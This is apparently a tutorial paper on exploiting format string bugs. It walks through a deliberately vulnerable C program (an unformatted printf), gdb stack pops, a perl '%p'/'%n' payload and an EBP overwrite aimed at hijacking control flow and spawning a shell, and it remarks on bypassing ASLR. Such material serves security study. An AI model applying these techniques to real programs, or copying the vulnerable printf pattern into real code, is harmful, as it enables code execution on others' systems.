                    Further advances in to exploiting vulnerable format string bugs

                                         www.open-security.org
                    ---------------------------------------------------------------


Format string bugs are a method of abusing incorrect usage of the format functions like printf, sprintf,
snprintf, fprintf, vfprintf and the likes. When these functions are called they require that a version
specefier is used to display the data stored in one or more directives.

In the last format paper I discussed how to use a user supplied string to allow for an abitrary write to
any location in memory we wished. By modifying the GOT, DTORS or some other useful memory location, it is
trivial to hijack the process completely and execute malicious, arbitrary code.

However with the code below you will see that there are a couple of locations that make this impossible
for us. This time we have a limited 2/3 byte, one time write, but we can still cause an overwrite to grant
us control of the process and execute our very arbitrary code  :-)  In this paper we will combine several
well known techniques together:

       1) Format string abuse
       2) Frame pointer overwrite
       3) Return-to-libc

This method, minus (3) was used in the POC exploit for RealPlayer, and as such is an applicable method in
attacking wild applications. There are many ways to attack format string bugs but this paper will focus on
modifying EBP pointer as was done in the Realplayer adviosory.

It is worth noting that this method relies on the fact that the vulnerabe printf() syscall is not in the
main() function, but perhaps 3 or more functions deep within the program. This is required due to the fact
that the printf() syscall will pop addresses from it's current position, and suppose we are in the main()
function already, there will only be the addresses of the main frame to play with and as such, a nice EBP
takeover will not be possible.

This is how it might look:


	<------------------------ Stack growth ----------------------

	-------------------------------------------------------------
	| Frame 5 | Frame 4 | Frame 3 | Frame 2 | Frame 1 | Frame 0 |
	-------------------------------------------------------------

	...... printf(%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x) .....


When there are no other frames to use, when the printf() function is in the main() body of the code, you
need to rely on finding a pointer or some other useful location that is writable to gain control of the
applications flow. There may be lots of locations that can be used to gain control of the binary, it just
depends how lucky the attacker is and how hard she looks. Some areas that could be useful include:


       Function pointers
       Locations used in call instructions
       Locations used in jmp instructions
       Locations pointing to locations used in call or jmp instructions
       Locations pointing to locations pointing to locations use in call or jmp instructions ;)
       Addresses pointed to by registers, including ebp, esp and eip
       etc,etc...


Anyway, enough of the talk, let us start with the fun!


/* fmt.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SIZE1 150
#define SIZE2 160

int yummy(char *vuln, char *buf);
int yumm(char *vuln);
int yum(char *vuln);

int yummy(char *vuln, char *buf)
{
       if((strlen(vuln) > SIZE1) || (strlen(vuln) < 0)) {
               puts("\nString error! Try again!");
               return(EXIT_FAILURE);
       }
       memcpy(buf, vuln, strlen(vuln));
       yumm(vuln);
       return(EXIT_SUCCESS);
}

int yumm(char *vuln)                    
{
       printf("You typed: ");
       yum(vuln);
       return(EXIT_SUCCESS);
}

int yum(char *vuln)                     
{
       printf(vuln); printf("\n");
       return(EXIT_SUCCESS);
}

int main(int argc, char **argv)         
{
       char *buf = NULL;
       char *vuln = NULL;

       if(argc != 2)
               return(EXIT_FAILURE);

       buf = (char *)malloc(SIZE1);
       if(!buf) {
               perror("malloc");
               return(EXIT_FAILURE);
       }
       vuln = (char *)malloc(SIZE2);
       if(!vuln) {
               perror("malloc");
               return(EXIT_FAILURE);
       }

       vuln = argv[1];
       yummy(vuln, buf);
       free(buf); free(vuln);
       return(EXIT_SUCCESS);
}


As you can see in the code, the printf function does not have a format specifier assigned. This is where
the vulnerability lies, since we can now control how printf behaves. By passing a format specifier, we
are able to display the contents of the stack as in a standard format string bug.

Lets try and find our supplied string by popping more addresses:

From the output you should see that it has not been possible to reach our supplied string. As a result
you can't just pop the way to the supplied location and do a write anything anywhere. This is a tedious
restriction, but it does not stop us since we have a supply of other addresses we could potentially use.

What we need to look for are locations that we can write to, which will end in being able to gain control
of the applications execution. Using /proc/pid/maps we can find all writable locations of the running
process, then we just compare those addresses with what we popped via the format bug we abuse:


(gdb) shell cat /proc/14753/maps

Looking back at the stack pops, we can compare addresses reachable from command line with areas in the
process address space that are write or executable, preferably both:


0x40139ff4.0xbffffa18.0x8048568.0xbffffba5.0x40015cc0.0xbffffa38.0x804853f.0xbffffba5.
0xbffffba5.0xf0.0x40139ff4(nil).0x40015cc0.0xbffffa58.0x8048634.0xbffffba5.0x8049928.0xbffffa68.
0x804867a.0xbffffba5.0x8049928.0xbffffa88.0x4003a413.0x2.0xbffffab4.0xbffffac0.(nil).(nil).
0x4000aaa0.0x4000b5a0.0x40015ff4.0x2.0x8048420.(nil).0x8048441.0x8048593.0x2.0xbffffab4.0x8048660.
0x80486d0.0x4000b5a0.0xbffffaac.0x400167e4.0x2.0xbffffb94.0xbffffba5.(nil).0xbffffc96.0xbffffc9d.
0xbffffca8.0xbffffcb8.0xbffffcc4.0xbffffce8.0xbfffff1d.0xbfffff40.0xbfffff4c.0xbfffff86.0xbfffff9c.
0xbfffffa8.0xbfffffb9.0xbfffffc2.0xbfffffd4.0xbfffffdc.(nil).0x10.0x7e9fbbf.0x6.0x1000.0x11.0x64.
0x3.0x8048034.0x4.0x20.0x5.0x7.0x7.0x40000000.0x8.(nil)


With this information we can start to work through the addresses, verifying what each is responsible for
and narrowing down the location we can write to. 

Out of the addresses above, here is a map all the RWX addresses that are viable targets:


0xbffffa18.0xbffffba5.0xbffffa38.0xbffffba5.0xbffffba5.0xbffffa58.0xbffffba5.0xbffffa68
0xbffffba5.0xbffffa88.0xbffffab4.0xbffffac0.0xbffffab4.0xbffffaac.0xbffffb94.0xbffffba5
0xbffffc96.0xbffffc9d.0xbffffca8.0xbffffcb8.0xbffffcc4.0xbffffce8.0xbfffff1d.0xbfffff40
0xbfffff4c.0xbfffff86.0xbfffff9c.0xbfffffa8.0xbfffffb9.0xbfffffc2.0xbfffffd4.0xbfffffdc


We know we can write and execute things here which makes the job very simplistic, time to find out what
these addresses do in relation to the program we are attacking:


(gdb) r `perl -e 'print ".%p" x 80'`%n

The astute reader will see that right away there is something interesting :-) If you have a look at the
EBP registers in each of the frames, you will notice that some of these addresses are reachable with our
pops. This means that we can directly manipulate the EBP register with a 2 byte write. Let us try it and
see what happens.

It seems we were right, we have written 0x4141 (16705) to the EBP MSB. Once "mov %ebp, %esp" happens, ESP
becomes under our control. Now all we need to do is have our shellcode location address waiting at the
address in ESP, and we should have a shell.

What is needed might look something like so:


	[ EBP ] ----> [ ESP ] ---> [ EIP ] ---> [shellcode] ---> c0ntex@debauch:~$


So let us try. By exporting some known string into an environment variable, we can see if it is reachable
when we do a modification of EBP:


c0ntex@debauch:~$ export PAD=AAAABBBBCCCCDDDDEEEEFFFF
c0ntex@debauch:~$ /home/c0ntex/code/memenv PAD

[-] Environment variable [$PAD] is at [0xbfffff9c]
[-] Environment variable is set to [AAAABBBBCCCCDDDDEEEEFFFF]

Interesting :-) We seem to be able to control the next instruction to execute. Ok so we will now replace
the address being pointed to by EIP with one that contains some opcode and see if we can spawn us a nice
shell..

Perfect, it worked nicely for us! By using some addresses we can reach via pops, it is easily possible to
gain control of the process execution.

Say instead of EBP, we can write to a pointer and it's location is at 0x08049123. We could use our string
to modify the 0x9123 section of the address and point it to an arbitrary location. Let us also suppose that
some user input is stored at location 0x08057777, again the attacker can gain control of the process by
changing 0x08057777 to 0x08049123 with one write, and we win.

Another situation is when we can store our shellcode location in %eax for instance, all one needs to do is
search for a writeable / reachable place in memory where we can modify an address to a call *%eax, and we
win again. 

It should also be possible to bypass stack randomisation (ASLR) using tricks like this, as every time the
code runs, the useful EBP / blah addresses will be at the same pop distance on the stack, i.e 2 pops. The
only nasty thing would be brute forcing the shellcode location in either an environment variable or argv.

Though, it may be possible to perform the above pointer trick and bypass the need to brute force, that will
rely on there being no mmap() randomisation however.

This just goes to show that in cases when an attacker can not reach their supplied input directly during
the attack, it is still possible to gain control of the application, and, there are lots of variations that
can be used.

Even in worst case scenarios when an attacker can not reach supplied input AND can only perform one 2 byte,
or maybe 3 byte write, it is still not too difficult to gain control of the application.

As such, any format string bug is almost always exploitable, you just have to look hard enough. I hope this
short paper has been useful.
